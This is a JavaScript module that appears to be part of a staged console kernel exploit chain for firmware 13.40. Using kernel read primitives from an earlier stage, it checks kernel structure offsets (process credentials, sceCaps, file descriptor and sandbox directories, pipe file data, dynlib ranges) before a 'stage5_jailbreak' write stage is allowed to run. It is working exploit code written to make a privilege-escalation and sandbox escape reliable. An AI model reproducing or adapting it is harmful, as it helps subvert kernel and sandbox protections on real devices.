// off_validate.js -- read-only gate for bagagwa.js OFF table on 13.40.
// Run AFTER stage4 (kread/kwrite established) and BEFORE stage5 (writes).
// Performs ZERO kernel writes. Any failure => DO NOT run stage5_jailbreak;
// the OFF table does not match this firmware.
//
// Usage:
//   import { validateOff } from "./off_validate.js";
//   const v = await validateOff(engine);
//   for (const c of v.checks) log((c.ok ? "  PASS " : "  FAIL ") + c.name + " " + c.detail);
//   if (!v.ok) throw new Error("OFF mismatch: " + v.failed.join(","));

function isKernelPtr(v) {
  return v !== null && v !== undefined && (v.hi >>> 16) === 0xffff;
}
function hx(v) {
  if (v === null || v === undefined) return "null";
  return "0x" + (v.hi >>> 0).toString(16) + (v.low >>> 0).toString(16).padStart(8, "0");
}
function isSmallInt(v, max) {
  return Number.isInteger(v) && v >= 0 && v <= (max === undefined ? 100000 : max);
}

export async function validateOff(engine) {
  const checks = [];
  const fail = [];
  const pass = (name, ok, detail) => {
    checks.push({ name, ok: !!ok, detail: detail || "" });
    if (!ok) fail.push(name);
  };
  const OFF = engine.OFF;
  const S = engine.S;

  // 0. Prerequisites: stage4 must have set these.
  pass("s4.curproc-set", isKernelPtr(S.curproc), hx(S.curproc));
  pass("s4.fdOfiles-set", isKernelPtr(S.fdOfiles), hx(S.fdOfiles));
  pass("s4.pipes-set", isKernelPtr(S.masterPipeData) && isKernelPtr(S.victimPipeData),
    hx(S.masterPipeData) + " " + hx(S.victimPipeData));
  if (fail.length) return { ok: false, checks, failed: fail };

  // 1. curproc.pid agrees with getpid (validates PROC_PID via findCurproc path).
  try {
    const cp = await engine.findCurproc();
    pass("proc.pid-getpid", cp.ok, cp.ok ? ("pid=" + cp.pid) : cp.why);
    if (cp.ok) {
      const pid = await engine.kread32Fast(S.curproc.add32(OFF.PROC_PID));
      pass("proc.pid-kread", pid.ret === 4 && pid.v === cp.pid,
        "ret=" + pid.ret + " kread=" + pid.v + " getpid=" + cp.pid);
    }
  } catch (e) {
    pass("proc.pid-getpid", false, String((e && e.message) || e));
  }

  // 2. p_ucred + uid/gid fields plausible (validates PROC_UCRED + UCRED_*).
  const uc = await engine.kread64Fast(S.curproc.add32(OFF.PROC_UCRED));
  pass("proc.ucred-ptr", uc.ret === 8 && isKernelPtr(uc.v), "ret=" + uc.ret + " " + hx(uc.v));
  if (uc.ret === 8 && isKernelPtr(uc.v)) {
    const u = uc.v;
    const uid = await engine.kread32Fast(u.add32(OFF.UCRED_CR_UID));
    const ruid = await engine.kread32Fast(u.add32(OFF.UCRED_CR_RUID));
    const ng = await engine.kread32Fast(u.add32(OFF.UCRED_CR_NGROUPS));
    pass("ucred.uid", uid.ret === 4 && isSmallInt(uid.v, 60000), "ret=" + uid.ret + " v=" + uid.v);
    pass("ucred.ruid", ruid.ret === 4 && isSmallInt(ruid.v, 60000), "ret=" + ruid.ret + " v=" + ruid.v);
    pass("ucred.ngroups", ng.ret === 4 && isSmallInt(ng.v, 1024), "ret=" + ng.ret + " v=" + ng.v);
    const caps0 = await engine.kread64Fast(u.add32(OFF.UCRED_CR_SCECAPS0));
    pass("ucred.caps0-readable", caps0.ret === 8, "ret=" + caps0.ret + " " + hx(caps0.v));
  }

  // 3. p_fd + cdir/rdir/jdir (validates PROC_FD + FD_*).
  const fd = await engine.kread64Fast(S.curproc.add32(OFF.PROC_FD));
  pass("proc.fd-ptr", fd.ret === 8 && isKernelPtr(fd.v), "ret=" + fd.ret + " " + hx(fd.v));
  if (fd.ret === 8 && isKernelPtr(fd.v)) {
    const cd = await engine.kread64Fast(fd.v.add32(OFF.FD_CDIR));
    const rd = await engine.kread64Fast(fd.v.add32(OFF.FD_RDIR));
    const jd = await engine.kread64Fast(fd.v.add32(OFF.FD_JDIR));
    pass("fd.cdir", cd.ret === 8 && isKernelPtr(cd.v), "ret=" + cd.ret + " " + hx(cd.v));
    pass("fd.rdir", rd.ret === 8 && isKernelPtr(rd.v), "ret=" + rd.ret + " " + hx(rd.v));
    pass("fd.jdir-zero-or-ptr", jd.ret === 8 &&
      ((jd.v.low === 0 && jd.v.hi === 0) || isKernelPtr(jd.v)),
      "ret=" + jd.ret + " " + hx(jd.v));
    pass("fd.cdir-eq-rdir-sandboxed", cd.ret === 8 && rd.ret === 8 &&
      cd.v.low === rd.v.low && cd.v.hi === rd.v.hi,
      hx(cd.v) + " vs " + hx(rd.v));
  }

  // 4. filedesc -> ofiles -> hdr (validates FILEDESC_OFILES + FDESCENTTBL_HDR).
  if (fd.ret === 8 && isKernelPtr(fd.v)) {
    const tbl = await engine.kread64Fast(fd.v.add32(OFF.FILEDESC_OFILES));
    pass("filedesc.ofiles", tbl.ret === 8 && isKernelPtr(tbl.v), "ret=" + tbl.ret + " " + hx(tbl.v));
    if (tbl.ret === 8 && isKernelPtr(tbl.v)) {
      const hdr = await engine.kread64Fast(tbl.v.add32(OFF.FDESCENTTBL_HDR));
      pass("fdescenttbl.hdr", hdr.ret === 8 && isKernelPtr(hdr.v),
        "ret=" + hdr.ret + " " + hx(hdr.v) + " expect~" + hx(S.fdOfiles));
    }
  }

  // 5. master pipe file -> f_data (validates FILE_F_DATA on a live fd).
  if (S.masterRfd >= 0) {
    const fp = await engine.fgetFast(S.masterRfd);
    pass("fget.master", fp.ret === 8 && isKernelPtr(fp.v), "ret=" + fp.ret + " " + hx(fp.v));
    if (fp.ret === 8 && isKernelPtr(fp.v)) {
      const fdata = await engine.kread64Fast(fp.v.add32(OFF.FILE_F_DATA));
      pass("file.f_data", fdata.ret === 8 && isKernelPtr(fdata.v),
        "ret=" + fdata.ret + " " + hx(fdata.v));
    }
  }

  // 6. dynlib range sane (validates PROC_DYNLIB + DYNLIB_*).
  const dl = await engine.kread64Fast(S.curproc.add32(OFF.PROC_DYNLIB));
  pass("proc.dynlib-ptr", dl.ret === 8 && isKernelPtr(dl.v), "ret=" + dl.ret + " " + hx(dl.v));
  if (dl.ret === 8 && isKernelPtr(dl.v)) {
    const scs = await engine.kread64Fast(dl.v.add32(OFF.DYNLIB_SC_START));
    const sce = await engine.kread64Fast(dl.v.add32(OFF.DYNLIB_SC_END));
    const sane = scs.ret === 8 && sce.ret === 8 &&
      (sce.v.hi > scs.v.hi || (sce.v.hi === scs.v.hi && sce.v.low >= scs.v.low));
    pass("dynlib.sc-range", sane, hx(scs.v) + "-" + hx(sce.v));
  }

  return { ok: fail.length === 0, checks, failed: fail };
}
